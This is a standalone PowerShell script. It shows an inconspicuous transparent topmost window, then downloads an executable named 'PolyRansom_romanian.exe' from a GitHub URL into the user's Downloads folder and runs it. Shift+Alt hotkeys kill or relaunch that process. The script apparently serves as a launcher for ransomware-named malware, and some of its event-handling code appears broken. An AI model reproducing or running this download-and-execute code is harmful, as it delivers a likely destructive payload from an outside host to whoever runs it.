$url = "https://github.com/webntdev/webntdev.github.io/raw/main/apps/PolyRansom_romanian.exe"
$downloadPath = Join-Path $env:USERPROFILE "Downloads\PolyRansom_romanian.exe"
$webClient = New-Object System.Net.WebClient

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.Windows.Input

$form = New-Object System.Windows.Forms.Form
$form.StartPosition = 'Manual' 
$form.FormBorderStyle = 'None'
$form.BackColor = [System.Drawing.Color]::Lime
$form.TransparencyKey = $form.BackColor
$form.TopMost = $true
$form.Width = 50
$form.Height = 50 

$label = New-Object System.Windows.Forms.Label
$label.Text = "H"
$label.ForeColor = [System.Drawing.Color]::Green
$label.Font = New-Object System.Drawing.Font("Arial", 10, [System.Drawing.FontStyle]::Bold)
$label.AutoSize = $true
$label.BackColor = [System.Drawing.Color]::Transparent

$form.Controls.Add($label)

$screenWidth = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
$screenHeight = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Height

$formLocationX = [int]$screenWidth - [int]$form.Width
$formLocationY = [int]$screenHeight - [int]$form.Height

$form.Location = New-Object System.Drawing.Point($formLocationX, $formLocationY)

$form.Add_MouseDown({
    $form.Capture = $false
})

$form.ShowDialog()

Start-Sleep -Seconds 1



function DownloadAndExecute {
    $webClient.DownloadFile($url, $downloadPath)
    if (Test-Path $downloadPath) {
        Start-Process -FilePath $downloadPath -Wait
    }
}

function CloseApplication {
    Stop-Process -Name "PolyRansom_romanian" -Force
}

function OpenApplication {
    Start-Process -FilePath $downloadPath -Wait
}


DownloadAndExecute


Register-ObjectEvent -InputObject $host -EventName "KeyDown" -Action {
    if ($_.Key -eq "I" -and $_.Shift -and $_.Alt) {
        CloseApplication
    }
} | Out-Null

Register-ObjectEvent -InputObject $host -EventName "KeyDown" -Action {
    if ($_.Key -eq "O" -and $_.Shift -and $_.Alt) {
        OpenApplication
    }
} | Out-Null


try {
    Wait-Event -Action { } -Timeout ([System.Threading.Timeout]::Infinite)
}
finally {
    Get-EventSubscriber | Unregister-Event
}
